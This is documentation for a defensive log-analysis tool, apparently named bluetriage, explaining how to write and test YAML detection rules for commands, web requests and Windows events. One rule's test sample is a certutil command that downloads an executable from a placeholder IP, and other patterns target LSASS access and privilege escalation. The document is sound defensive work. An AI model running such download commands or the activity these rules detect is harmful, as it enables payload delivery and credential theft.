# Writing detection rules

Every detection in bluetriage is a YAML rule in [`bluetriage/rules/`](../bluetriage/rules/).
You can add rules **without writing Python**, and every rule carries its own tests.

```bash
bluetriage rules list                 # what is loaded (add --type event, web, ...)
bluetriage rules test                 # run every rule's examples
bluetriage rules test my-new-rule     # just yours
bluetriage hunt logs/ --rules-dir ./my-rules     # use your own rules directory
```

## Anatomy of a rule

```yaml
- id: cmd-certutil-download          # unique, lowercase-kebab-case
  name: SUSPICIOUS_COMMAND           # category: groups findings, shown in reports and block reasons
  title: certutil used to download a file (LOLBin)
  type: command                      # web | command | line | event | correlation
  severity: high                     # info | low | medium | high | critical
  mitre: [T1105]                     # ATT&CK IDs; must exist in resources/attack.yml
  block: inbound                     # optional: generate a firewall rule for the finding's IP
  pattern: '\bcertutil(?:\.exe)?\b.{0,100}-urlcache\b.{0,200}(?:https?|ftp)://'
  description: Optional longer explanation.
  references: ["https://lolbas-project.github.io/lolbas/Binaries/Certutil/"]
  false_positives: ["Admins fetching CRLs by hand"]
  author: your-github-handle
  tests:
    match:    ["certutil.exe -urlcache -split -f http://203.0.113.99/p.exe p.exe"]
    no_match: ["certutil -hashfile file.exe SHA256"]
```

Regexes are case-insensitive by default (`ignore_case: false` to change that) and use
Python's [`re` syntax](https://docs.python.org/3/library/re.html). In YAML, put them in
single quotes so backslashes stay literal; write a literal `'` as `''`.

## Rule types

| type | Matched against | Finding IP |
|---|---|---|
| `web` | URL-decoded request path (a `+`→space variant is also tried); add `fields: [path, user_agent, referrer]` to choose | HTTP client |
| `command` | sudo `COMMAND=`, Windows 4688 / Sysmon 1 `CommandLine`, PowerShell 4104 `ScriptBlockText`, and any base64 / `-EncodedCommand` payload **after decoding** | client IP if known |
| `line` | the raw line of text logs (auth.log, syslog, …) | IP parsed from the line |
| `event` | structured Windows events (see below) | `ip_field` if set |
| `correlation` | built-in stateful logic; YAML tunes it | the attacker |

### Event rules

```yaml
- id: win-privileged-group-add
  name: PRIVILEGE_ESCALATION
  title: Account added to privileged group
  type: event
  severity: high
  mitre: [T1098]
  match:
    event_id: [4728, 4732, 4756]          # one number or a list
    provider: Microsoft-Windows-Security-Auditing   # optional, substring match
    channel: Security                      # optional, exact match
    fields:                                # optional; EVERY regex must match
      TargetUserName: '^(?:administrators|domain admins)$'
      # '*': 'regex'                       # special: matches if ANY field matches (unnamed <Data> events)
  detail: "{MemberSid} added to {TargetUserName} by {SubjectUserName}"   # {Field} placeholders
  tests:
    match:    [{event_id: 4732, TargetUserName: Administrators, MemberSid: S-1-5-21-1-1001}]
    no_match: [{event_id: 4732, TargetUserName: Remote Desktop Users}]
```

Field names are exactly the `<Data Name="...">` names of the event (or the `event_data`
keys in Winlogbeat JSON). Test samples are mappings with `event_id`, optional `provider` /
`channel`, and the fields. Windows writes `-` for empty fields; templates drop those.

### Correlation rules

The six built-ins live in [`correlation.yml`](../bluetriage/rules/correlation.yml). Their
logic is in `detectors.py`; their numbers are yours to tune:

| id | tunable keys |
|---|---|
| `auth-brute-force` | `threshold`, `window_seconds`, `spraying_min_users`, `mitre_spraying` |
| `auth-success-after-brute-force` | uses the brute-force threshold and window |
| `encoded-payload` | `severity_command`, `title_command`, `mitre_command` |
| all | `severity`, `mitre`, `block`, `enabled` |

## Overriding packaged rules

Files in `--rules-dir` are merged on top of the packaged rules. If an `id` already exists,
**only the keys you set change**:

```yaml
# my-rules/tuning.yml
- id: auth-brute-force
  threshold: 10
  window_seconds: 300
- id: win-kerberoasting
  enabled: false          # we still run legacy RC4 services
- id: win-sysmon-lsass-access
  match:                  # replace the match block to allowlist your EDR
    event_id: 10
    provider: Microsoft-Windows-Sysmon
    fields:
      TargetImage: '\\lsass\.exe$'
      GrantedAccess: '^0x(?:1010|1410|1438|143a|1fffff)$'
      SourceImage: '^(?!.*\\YourEDR\\agent\.exe$).+'
```

## Quality checklist (CI enforces the first four)

1. At least one `match` **and** one `no_match` example. The `no_match` should be a realistic
   benign look-alike (`/blog/union-station-review` for a `UNION SELECT` rule).
2. Every ATT&CK ID exists in `resources/attack.yml` (add new ones with their official name).
3. The regex compiles and the rule passes `bluetriage rules test`.
4. No unknown keys (a typo like `patern:` is an error, not silently ignored).
5. **Bounded quantifiers.** Rules only ever see the first 8 KB of input, but write
   `.{0,200}` instead of `.*` between keywords and avoid nested quantifiers like `(a+)+`,
   so a hostile 8 KB command line stays fast.
6. Prefer behaviour that is hard to rename away (the PortProxy registry key) over names an
   attacker controls (a renamed `psexec.exe`).
7. Note known false positives in `false_positives:`.
